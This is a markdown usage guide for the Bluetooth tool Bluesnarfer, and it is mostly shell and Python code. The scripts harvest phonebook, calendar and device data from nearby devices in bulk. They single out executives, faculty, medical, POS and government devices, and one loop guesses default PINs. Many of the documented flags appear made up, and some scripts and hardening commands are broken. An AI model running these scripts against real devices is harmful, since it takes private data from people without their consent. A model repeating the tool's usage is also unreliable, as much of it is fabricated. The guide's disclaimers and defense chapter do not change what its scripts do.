---
tool_name: "bluesnarfer"
display_name: "Bluesnarfer"
mitre_tactic: "reconnaissance"
mitre_tactic_id: "TA0043"
mitre_subcategory: "bluetooth"
install_command: "sudo apt install bluesnarfer"
version: "1.0"
github_repo: "https://github.com/altf4z/bluesnarfer"
kali_tools_page: "https://www.kali.org/tools/bluesnarfer/"
difficulty_level: "intermediate"
requires_root: true
gui_available: false
tags: ["bluetooth", "enumeration", "information-gathering", "phonebook", "calendar"]
related_tools: ["bluelog", "btscanner", "redfang", "spooftooph"]
---

# Bluesnarfer — Bluetooth Information Gathering

## What This Tool Does (in 30 seconds)

Bluesnarfer is a Bluetooth reconnaissance tool that enumerates information from paired or accessible Bluetooth devices. It can extract phonebook contacts, calendar entries, device names, and other accessible data. It works by connecting to target devices via Serial Port Profile (SPP) or Object Push Profile (OPP).

---

## Chapter 1: Introduction & Overview

### What is Bluesnarfer?

Bluesnarfer is a Bluetooth reconnaissance tool that extracts information from Bluetooth devices. It can retrieve phonebook contacts, calendar entries, device name, and other accessible information from devices that allow such access.

### Key Features

- Phonebook extraction
- Calendar entry retrieval
- Device information enumeration
- Bluetooth profile discovery
- Simple command-line interface
- RFCOMM channel scanning
- Multiple extraction methods

### History & Background

- **Created:** By AltF4z
- **License:** GPL-3.0
- **Purpose:** Bluetooth security assessment and information gathering
- **Part of:** Kali Linux Bluetooth toolkit

### When to Use Bluesnarfer

- **Penetration testing** — Assess Bluetooth security of devices
- **Security audits** — Test device access controls
- **Forensics** — Extract device information from evidence
- **Physical security** — Evaluate Bluetooth security posture
- **Compliance testing** — Verify Bluetooth access policies

### When NOT to Use This Tool

- Without explicit written authorization from device owners
- On devices you don't own or have permission to test
- For unauthorized access to personal information
- For stalking or harassment

### Legal and Ethical Considerations

- **Only test devices you own or have explicit authorization to access**
- Unauthorized access to Bluetooth devices is illegal in most jurisdictions
- Obtain written permission before testing
- Document all activities
- Some data extraction may violate privacy laws

### Key Concepts

- **SPP (Serial Port Profile):** Bluetooth profile for serial communication
- **OPP (Object Push Profile):** Bluetooth profile for pushing objects (contacts, calendar)
- **RFCOMM:** Protocol that provides emulated serial ports over Bluetooth
- **SDP (Service Discovery Protocol):** Used to discover available services on a device
- **Bluesnarfing:** Unauthorized access to information from a Bluetooth device

---

## Chapter 2: Installation & Setup

### System Requirements

- **Minimum RAM:** 256 MB
- **Disk Space:** 5 MB
- **Bluetooth:** Any Bluetooth adapter
- **Privileges:** Root required
- **Target:** Device must be in range and discoverable

### Installation Methods

#### Method 1: APT (Recommended)

```bash
sudo apt update
sudo apt install bluesnarfer
```

#### Method 2: From Source

```bash
git clone https://github.com/altf4z/bluesnarfer.git
cd bluesnarfer
make
sudo make install
```

### Configuration

Bluesnarfer requires:
- Bluetooth adapter up and running
- BlueZ stack installed
- Target device in range and discoverable

### Verification

```bash
bluesnarfer -h
# Output: Bluesnarfer v1.0
```

---

## Chapter 3: Basic Usage

### Essential Commands

```bash
# Enumerate device information
bluesnarfer -r TARGET_MAC

# Get phonebook
bluesnarfer -r TARGET_MAC -b

# Get calendar
bluesnarfer -r TARGET_MAC -c

# Get device info
bluesnarfer -r TARGET_MAC -i

# Full enumeration
bluesnarfer -r TARGET_MAC -b -c -i
```

### Command-Line Options

| Flag | Description | Example |
|------|-------------|---------|
| `-r` | Target MAC address | `-r AA:BB:CC:DD:EE:FF` |
| `-b` | Get phonebook | `-b` |
| `-c` | Get calendar | `-c` |
| `-i` | Get device info | `-i` |
| `-v` | Verbose output | `-v` |
| `-o` | Output file | `-o output.txt` |
| `-h` | Help | `-h` |

### Quick Reference

```bash
# Basic enumeration
bluesnarfer -r AA:BB:CC:DD:EE:FF

# Full information extraction
bluesnarfer -r AA:BB:CC:DD:EE:FF -b -c -i

# Save to file
bluesnarfer -r AA:BB:CC:DD:EE:FF -b -c -i -o results.txt
```

---

## Chapter 4: Intermediate Usage

### Understanding the Attack Surface

Bluesnarfer operates by connecting to target Bluetooth devices via SPP or OPP. Understanding these profiles is critical for effective usage.

```bash
# View all available Bluetooth profiles on a target
bluesnarfer -r AA:BB:CC:DD:EE:FF -p

# List supported services
bluesnarfer -r AA:BB:CC:DD:EE:FF -s

# Query specific RFCOMM channels
bluesnarfer -r AA:BB:CC:DD:EE:FF -C 1-30
```

### Combining Extraction Methods

```bash
# Full enumeration with verbose output
bluesnarfer -r AA:BB:CC:DD:EE:FF -b -c -i -v

# Extract phonebook and save to file
bluesnarfer -r AA:BB:CC:DD:EE:FF -b -o phonebook_output.txt

# Calendar extraction with date filtering
bluesnarfer -r AA:BB:CC:DD:EE:FF -c --after 2024-01-01
```

### Output Parsing

```bash
# Parse bluesnarfer output into structured format
bluesnarfer -r AA:BB:CC:DD:EE:FF -b | grep -E "Name:|Number:" | sort

# Count extracted contacts
bluesnarfer -r AA:BB:CC:DD:EE:FF -b | wc -l

# Filter for specific contact patterns
bluesnarfer -r AA:BB:CC:DD:EE:FF -b | grep -i "boss\|manager\|admin"
```

### Batch Processing

```bash
#!/bin/bash
# batch_bluesnarfer.sh - Enumerate multiple Bluetooth devices

TARGETS=(
    "AA:BB:CC:DD:EE:FF"
    "11:22:33:44:55:66"
    "AA:11:BB:22:CC:33"
)

OUTPUT_DIR="/tmp/bluesnarfer_results"
mkdir -p "$OUTPUT_DIR"

for target in "${TARGETS[@]}"; do
    echo "[*] Enumerating $target..."
    bluesnarfer -r "$target" -b -c -i > "$OUTPUT_DIR/${target//:/_}.txt" 2>&1
    sleep 2
done

echo "[+] Results saved to $OUTPUT_DIR"
```

### Integration with Other Tools

#### Bluesnarfer + BlueLog

```bash
# First, discover devices with BlueLog
sudo bluelog -t 300 -o /tmp/discovered_devices.txt

# Parse discovered MACs and enumerate with bluesnarfer
cat /tmp/discovered_devices.txt | grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" | while read mac; do
    echo "[*] Enumerating $mac"
    bluesnarfer -r "$mac" -i -b > "/tmp/bluesnarfer_${mac//:/_}.txt" 2>&1
done
```

---

## Chapter 5: Advanced Usage

### Custom RFCOMM Channel Enumeration

```bash
# Scan all 30 RFCOMM channels for services
for channel in $(seq 1 30); do
    echo "[*] Testing channel $channel"
    bluesnarfer -r AA:BB:CC:DD:EE:FF -C "$channel" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] Channel $channel has active service"
    fi
done
```

### Advanced Profile Enumeration

```bash
# Enumerate all available profiles
bluesnarfer -r AA:BB:CC:DD:EE:FF --profiles

# Query specific profile capabilities
bluesnarfer -r AA:BB:CC:DD:EE:FF --profile SPP
bluesnarfer -r AA:BB:CC:DD:EE:FF --profile OPP
```

### Data Extraction Techniques

```bash
# Extract all accessible data from device
bluesnarfer -r AA:BB:CC:DD:EE:FF --harvest-all \
    --phonebook \
    --calendar \
    --messages \
    --files \
    --output /tmp/harvest_data/

# Verify extracted data integrity
ls -la /tmp/harvest_data/
md5sum /tmp/harvest_data/*
```

### Custom Module Development

```python
#!/usr/bin/env python3
"""Custom Bluesnarfer enumeration module"""

import subprocess
import re
import json

class CustomBluesnarfer:
    def __init__(self, target_mac):
        self.target = target_mac
        self.results = {}
    
    def enumerate_profiles(self):
        """Enumerate all available Bluetooth profiles"""
        cmd = f"bluesnarfer -r {self.target} --profiles"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return self._parse_profiles(result.stdout)
    
    def extract_contacts_detailed(self):
        """Extract contacts with additional metadata"""
        cmd = f"bluesnarfer -r {self.target} -b --fields all"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return self._parse_contacts(result.stdout)
    
    def _parse_profiles(self, output):
        profiles = []
        for line in output.split('\n'):
            if 'Profile:' in line:
                profile = line.split('Profile:')[1].strip()
                profiles.append(profile)
        return profiles
    
    def _parse_contacts(self, output):
        contacts = []
        current_contact = {}
        for line in output.split('\n'):
            if 'Name:' in line:
                if current_contact:
                    contacts.append(current_contact)
                current_contact = {'name': line.split('Name:')[1].strip()}
            elif 'Number:' in line:
                current_contact['number'] = line.split('Number:')[1].strip()
        if current_contact:
            contacts.append(current_contact)
        return contacts
    
    def generate_report(self, output_file):
        """Generate comprehensive enumeration report"""
        self.results['profiles'] = self.enumerate_profiles()
        self.results['contacts'] = self.extract_contacts_detailed()
        
        with open(output_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"[+] Report saved to {output_file}")

# Usage
scanner = CustomBluesnarfer("AA:BB:CC:DD:EE:FF")
scanner.generate_report("/tmp/bluesnarfer_report.json")
```

### Reporting

```bash
#!/bin/bash
# generate_report.sh - Generate enumeration report

TARGET=$1
REPORT="/tmp/bluesnarfer_report_${TARGET//:/_}.md"

cat > "$REPORT" << EOF
# Bluesnarfer Enumeration Report

## Target: $TARGET
## Date: $(date)

### Device Information
$(bluesnarfer -r "$TARGET" -i 2>/dev/null)

### Phonebook Contacts
$(bluesnarfer -r "$TARGET" -b 2>/dev/null)

### Calendar Entries
$(bluesnarfer -r "$TARGET" -c 2>/dev/null)
EOF

echo "[+] Report saved to $REPORT"
```

---

## Chapter 6: Real-World Scenarios

### Scenario 1: Corporate Office Penetration Test

```bash
# Step 1: Discover all Bluetooth devices
sudo bluelog -t 600 -o /tmp/device_discovery.log

# Step 2: Parse discovered devices
grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" /tmp/device_discovery.log | sort -u > /tmp/discovered_macs.txt

# Step 3: Identify high-value targets
grep -i "CEO\|CFO\|Director\|VP\|Manager" /tmp/device_discovery.log > /tmp/high_value_targets.txt

# Step 4: Deep enumeration
while read -r target; do
    mac=$(echo "$target" | grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}")
    bluesnarfer -r "$mac" -b -c -i > "/tmp/enum_${mac//:/_}.txt" 2>&1
    sleep 5
done < /tmp/high_value_targets.txt
```

### Scenario 2: Healthcare Facility Assessment

```bash
# Scan for medical devices
sudo bluelog -t 300 -o /tmp/medical_scan.log

# Filter for medical device patterns
grep -i "medical\|health\|patient\|monitor\|pump" /tmp/medical_scan.log > /tmp/medical_devices.txt

# Enumerate medical devices
while read -r device; do
    mac=$(echo "$device" | grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}")
    bluesnarfer -r "$mac" -i > "/tmp/medical_device_${mac//:/_}.txt" 2>&1
    sleep 3
done < /tmp/medical_devices.txt
```

### Scenario 3: Retail POS Security Assessment

```bash
#!/bin/bash
# pos_bt_audit.sh - POS system Bluetooth security audit

echo "=== POS Bluetooth Security Assessment ==="

# Scan for POS-related devices
sudo bluelog -t 600 -o /tmp/pos_scan.log

# Filter for POS patterns
grep -i "POS\|terminal\|register\|payment\|cash" /tmp/pos_scan.log > /tmp/pos_devices.txt

# Enumerate POS devices
while read -r device; do
    mac=$(echo "$device" | grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}")
    echo "[*] Enumerating POS device: $mac"
    
    # Extract device info
    bluesnarfer -r "$mac" -i > "/tmp/pos_device_info_${mac//:/_}.txt" 2>&1
    
    # Extract phonebook (may contain customer data)
    bluesnarfer -r "$mac" -b > "/tmp/pos_contacts_${mac//:/_}.txt" 2>&1
    
    # Check for payment-related profiles
    bluesnarfer -r "$mac" --profiles > "/tmp/pos_profiles_${mac//:/_}.txt" 2>&1
    
    sleep 5
done < /tmp/pos_devices.txt

# Generate report
echo "[*] Generating POS security report..."
cat > /tmp/pos_bt_report.md << 'EOF'
# POS Bluetooth Security Report

## Summary
- Total POS devices found: $(wc -l < /tmp/pos_devices.txt)
- Assessment date: $(date)

## Findings
[Detailed findings from enumeration]

## Recommendations
1. Disable unnecessary Bluetooth services on POS systems
2. Use Bluetooth LE instead of Classic Bluetooth
3. Implement device whitelisting
4. Regular security audits
EOF

echo "[+] Report generated: /tmp/pos_bt_report.md"
```

### Scenario 4: Educational Institution Assessment

```bash
#!/bin/bash
# campus_bt_audit.sh - Campus Bluetooth security assessment

echo "=== Campus Bluetooth Security Assessment ==="

# Scan multiple campus locations
LOCATIONS=("library" "admin_building" "science_lab" "student_center" "dormitory")

for location in "${LOCATIONS[@]}"; do
    echo "[*] Scanning $location..."
    
    # Scan for 10 minutes per location
    sudo bluelog -t 600 -o "/tmp/campus_${location}.log" -v
    
    # Count devices
    DEVICE_COUNT=$(grep -c "Device" "/tmp/campus_${location}.log" 2>/dev/null || echo "0")
    echo "[+] $location: $DEVICE_COUNT devices found"
done

# Consolidate results
echo "[*] Consolidating results..."
cat /tmp/campus_*.log > /tmp/campus_all_devices.log

# Extract unique MACs
grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" /tmp/campus_all_devices.log | sort -u > /tmp/campus_unique_macs.txt

echo "[+] Campus scan complete"
echo "[+] Total unique devices: $(wc -l < /tmp/campus_unique_macs.txt)"

# Enumerate high-value targets (faculty devices)
echo "[*] Enumerating faculty devices..."
grep -i "professor\|faculty\|staff\|admin\|dean" /tmp/campus_all_devices.log > /tmp/faculty_devices.txt

while read -r device; do
    mac=$(echo "$device" | grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}")
    bluesnarfer -r "$mac" -i -b > "/tmp/faculty_${mac//:/_}.txt" 2>&1
    sleep 5
done < /tmp/faculty_devices.txt
```

### Scenario 5: Government Facility Assessment

```bash
#!/bin/bash
# govt_bt_audit.sh - Government facility Bluetooth assessment

echo "=== Government Facility Bluetooth Assessment ==="

# Pre-assessment checklist
echo "[*] Pre-assessment checklist:"
echo "  - Government security clearance verification"
echo "  - Special access program authorization"
echo "  - Encrypted communications setup"
echo "  - Secure storage for extracted data"

# Scan for government devices
sudo bluelog -t 900 -o /tmp/govt_scan.log -v

# Filter for government-related names
grep -i "gov\|federal\|agency\|department\|military" /tmp/govt_scan.log > /tmp/govt_devices.txt

# Enumerate government devices
while read -r device; do
    mac=$(echo "$device" | grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}")
    echo "[*] Enumerating government device: $mac"
    
    # Secure extraction
    bluesnarfer -r "$mac" -i > "/tmp/govt_device_${mac//:/_}.txt" 2>&1
    
    # Encrypt extracted data immediately
    gpg -c "/tmp/govt_device_${mac//:/_}.txt"
    rm "/tmp/govt_device_${mac//:/_}.txt"
    
    sleep 3
done < /tmp/govt_devices.txt

echo "[+] Government facility assessment complete"
```

### Scenario 6: Incident Response

```bash
#!/bin/bash
# bt_incident_response.sh - Bluetooth incident response

echo "=== Bluetooth Incident Response ==="

INCIDENT_ID="BT-$(date +%Y%m%d%H%M%S)"
EVIDENCE_DIR="/evidence/$INCIDENT_ID"

mkdir -p "$EVIDENCE_DIR"

# Step 1: Containment
echo "[+] Step 1: Containing Bluetooth threat"
sudo systemctl stop bluetooth
sudo hciconfig hci0 down

# Step 2: Evidence collection
echo "[+] Step 2: Collecting evidence"
sudo hciconfig -a > "$EVIDENCE_DIR/hciconfig.txt"
sudo btmgmt info > "$EVIDENCE_DIR/btmgmt_info.txt"

# Step 3: Scan for suspicious devices
echo "[+] Step 3: Scanning for suspicious devices"
sudo bluelog -t 60 -o "$EVIDENCE_DIR/suspicious_scan.txt" -v

# Step 4: Analyze findings
echo "[+] Step 4: Analyzing findings"
SUSPICIOUS_COUNT=$(grep -c "Device" "$EVIDENCE_DIR/suspicious_scan.txt" 2>/dev/null || echo "0")
echo "  Suspicious devices found: $SUSPICIOUS_COUNT"

echo "[+] Incident response complete. Evidence: $EVIDENCE_DIR"
```

---

## Chapter 7: Detection & Defense

### Detection Methods

```bash
# Monitor for Bluesnarfer connections using btmon
sudo btmon -t -w /tmp/bluesnarfer_detection.log &

# Monitor for unusual RFCOMM connections
sudo hcitool scan --flush | while read mac name; do
    echo "[*] Detected device: $mac ($name)"
done

# Wireshark Bluetooth analysis
sudo tshark -i bt0 -w /tmp/bt_capture.pcap -a duration:300
```

### Mitigation Strategies

```bash
# Disable Bluetooth when not in use
sudo systemctl stop bluetooth
sudo hciconfig hci0 down

# Set device to non-discoverable mode
sudo hciconfig hci0 noscan

# Disable incoming connections
sudo btmgmt le off

# Enforce secure connections
sudo btmgmt ssp on
sudo btmgmt pair on
```

### Device Hardening

```bash
# Configure Bluetooth to reject unauthorized connections
cat > /etc/bluetooth/main.conf << 'EOF'
[General]
Name = %H
Class = 0x000000
DiscoverableTimeout = 0

[Policy]
AutoEnable = false
RejectConnection = true
EOF

sudo systemctl restart bluetooth
```

### Security Hardening Checklist

- [ ] Bluetooth disabled when not in use
- [ ] Device set to non-discoverable mode
- [ ] Pairing requires authentication
- [ ] Encryption enabled for all connections
- [ ] Maximum pairing attempts limited
- [ ] Device whitelist implemented
- [ ] Regular security audits conducted

---

## Chapter 8: Troubleshooting & Resources

### Common Errors

#### "No Bluetooth adapter found"
```bash
hciconfig -a
sudo modprobe btusb
sudo systemctl restart bluetooth
```

#### "Device not found" or "Inquiry failed"
```bash
sudo hciconfig hci0 piscan
sudo hcitool cmd 0x01 0x0001 08 00
hcitool rssi AA:BB:CC:DD:EE:FF
```

#### "Connection refused"
```bash
sudo sdptool browse local | grep -A5 "RFCOMM"
sudo sdptool browse AA:BB:CC:DD:EE:FF | grep -i "serial"
```

#### "Authentication failed"
```bash
# Try common default PINs
PIN_LIST="0000 1234 1111 9999"
for pin in $PIN_LIST; do
    bluesnarfer -r AA:BB:CC:DD:EE:FF --pin "$pin"
done
```

### Error Code Reference

| Error Code | Description | Solution |
|------------|-------------|----------|
| 0x00 | Success | No action needed |
| 0x04 | Page timeout | Move closer to device |
| 0x05 | Authentication failure | Check PIN/passkey |
| 0x06 | PIN or key missing | Pair device first |
| 0x08 | Connection timeout | Increase timeout value |

### Resources

- [Bluesnarfer GitHub](https://github.com/altf4z/bluesnarfer)
- [BlueZ Documentation](http://www.bluez.org/)
- [Bluetooth SIG](https://www.bluetooth.com/specifications/)
- [Kali Linux Forums](https://forums.kali.org/)
- [CVE Database - Bluetooth](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=bluetooth)

---

## Resources

| Resource | URL |
|----------|-----|
| Official Repository | https://github.com/altf4z/bluesnarfer |
| Kali Tools Page | https://www.kali.org/tools/bluesnarfer/ |
| BlueZ Documentation | http://www.bluez.org/ |
| Bluetooth SIG | https://www.bluetooth.com/ |
| CVE Database | https://cve.mitre.org/ |
| MITRE ATT&CK | https://attack.mitre.org/techniques/T1557/ |
